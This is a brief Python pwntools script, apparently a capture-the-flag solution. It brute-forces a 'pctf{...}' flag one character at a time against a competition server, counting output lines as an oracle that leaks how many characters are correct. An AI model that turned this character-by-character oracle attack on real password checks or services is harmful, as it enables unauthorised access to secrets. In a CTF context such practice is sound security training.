from pwn import *
from string import ascii_letters, digits

flag = "pctf{"

while len(flag) < 19:
    for c in [
        *"{}_!@#$%^&*()",
        *ascii_letters,
        *digits
    ]:
        r = remote("chal.pctf.competitivecyber.club", 4757)
        r.clean()
        password = (flag + c).ljust(19, '.')
        r.sendline(password.encode())

        correct_chars = (len(r.recvall().decode().split('\n')) - 2) // 2
        if correct_chars > len(flag):
            flag += c
        r.close()

    print(flag)
